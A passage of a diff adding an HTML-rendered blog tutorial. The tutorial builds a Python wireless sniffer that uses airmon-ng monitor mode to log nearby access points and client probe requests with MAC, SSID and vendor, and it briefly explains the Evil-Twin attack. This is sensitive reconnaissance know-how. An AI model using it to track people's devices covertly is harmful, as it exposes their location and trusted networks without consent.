+&lt;span class=&quot;n&quot;&gt;ven_dic&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{}&lt;/span&gt;
+
+&lt;span class=&quot;c&quot;&gt;# Interface to monitor. Once you have your wireless&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;# nic listening, make sure to replace the variable string&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;# with your listening wireless nic.&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;# EX: iwconfig #to find your wireless nic (eg: wlan1)&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;# EX: sudo airmon-ng start wlan1 (Or the wireless nic you saw in previous step)&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;# EX: iwconfig #to find out the name of the nic airmon created&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;interface&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;mon0&quot;&lt;/span&gt;
+
+&lt;span class=&quot;c&quot;&gt;# Arguments&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;parser&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;argparse&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ArgumentParser&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;parser&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;add_argument&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;-V&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;--verbose&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;help&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;different formatting and detailed output&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;action&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;store_true&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;args&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;parser&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;parse_args&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;Now lets get a for loop going to read through our vendors.txt file so we can parse the input and assign it to the ven_dic dictionary we created earlier.&lt;/p&gt;
+
+&lt;p&gt;Please make sure the vendors.txt file is located in the same directory as the python script so that it may access it properly using the default setup.&lt;/p&gt;
+
+&lt;p&gt;Download: &lt;a href=&quot;//files/vendors.txt&quot;&gt;vendors.txt&lt;/a&gt;&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# Read in vendors and add to ven_dic&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;with&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;open&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;vendors.txt&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;as&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;vendors&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;line&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;vendors&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;join_line&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot; &quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;join&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;line&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;split&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;())&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;ven_mac&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;join_line&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;split&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot; &quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;ven_name&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;join_line&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;split&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot; &quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;ven_dic&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ven_mac&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ven_name&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;We’ll now start getting into defining our functions. If you are  unfamiliar with functions, think of them as basically routines. They can be called upon to perform actions that are repetative. They can also accept arguments or paramaters. For instance, these functions have two arguments, mac and ssid. We’ll pass in these items and the function will return information based on what we feed into it.&lt;/p&gt;
+
+&lt;p&gt;If this doesn’t make sense, don’t worry. It should be cleared up pretty shortly.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# Function to print if access point is detected&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;AccessPointPrint&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;mac&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ssid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
+    &lt;span class=&quot;c&quot;&gt;# Check to see if we know the vendor&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;mac&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;upper&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ven_dic&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;keys&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;():&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;vendor&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ven_dic&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;mac&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;upper&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()]&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;vendor&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;unknown&quot;&lt;/span&gt;
+        
+    &lt;span class=&quot;c&quot;&gt;# If verbose was used, print out the format below&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;args&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;verbose&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;-&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;146&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;colored&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;* I SEE YOU! *&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;red&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;attrs&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;bold&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;TIME    :&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;datetime&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;datetime&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;now&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;MAC     :&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;mac&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;TYPE    :&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;colored&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;ACCESS POINT&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;yellow&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;attrs&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;bold&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;SSID    :&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;colored&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ssid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;green&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;attrs&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;bold&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;CHIPSET :&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;vendor&lt;/span&gt;
+        &lt;span class=&quot;c&quot;&gt;# I recommend customizing the note below to your liking.&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;NOTE    : This is an access point that is broadcasting its wireless SSID for client connection. &quot;&lt;/span&gt;
+        
+    &lt;span class=&quot;c&quot;&gt;# Else print the default format&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;colored&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;* I SEE YOU! * &quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;red&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;attrs&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;bold&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;s (&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;s)&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;mac&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;vendor&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;as an&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; \
+            &lt;span class=&quot;n&quot;&gt;colored&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;ACCESS POINT&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;yellow&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;attrs&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;bold&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]),&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;for SSID:&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;colored&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ssid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;green&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;attrs&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;bold&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;
+
+&lt;span class=&quot;c&quot;&gt;# Function to print if client probe is detected&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;ProbePrint&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;mac&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ssid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
+    &lt;span class=&quot;c&quot;&gt;# Check to see if we know the vendor&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;mac&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;upper&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ven_dic&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;keys&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;():&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;vendor&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ven_dic&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;mac&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;upper&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()]&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;vendor&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;unknown&quot;&lt;/span&gt;
+        
+    &lt;span class=&quot;c&quot;&gt;# If verbose was used, print out the format below&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;args&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;verbose&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;-&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;146&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;colored&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;* I SEE YOU! *&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;red&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;attrs&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;bold&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;TIME    :&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;datetime&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;datetime&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;now&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;MAC     :&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;mac&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;TYPE    :&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;colored&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;PROBING&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;yellow&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;attrs&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;bold&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;SSID    :&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;colored&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ssid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;green&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;attrs&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;bold&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;CHIPSET :&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;vendor&lt;/span&gt;
+        &lt;span class=&quot;c&quot;&gt;# I recommend customizing the note below to your liking.&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&#39;NOTE    : &#39;&lt;/span&gt;  &lt;span class=&quot;s&quot;&gt;&#39;&#39;&#39;This traffic is from an asset attempting to connect to a wireless network it has seen before.
+          The wireless packets are able to be intercepted and parsed to reveal a network the device trusts. An &quot;Evil-Twin&quot;
+          attack can occur where a malicious actor creates an access point with the same SSID name to intercept credentials.&#39;&#39;&#39;&lt;/span&gt;
+          
+    &lt;span class=&quot;c&quot;&gt;# Else print the default format&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;colored&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;* I SEE YOU! * &quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;red&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;attrs&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;bold&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;s (&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;s)&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;mac&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;vendor&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; \
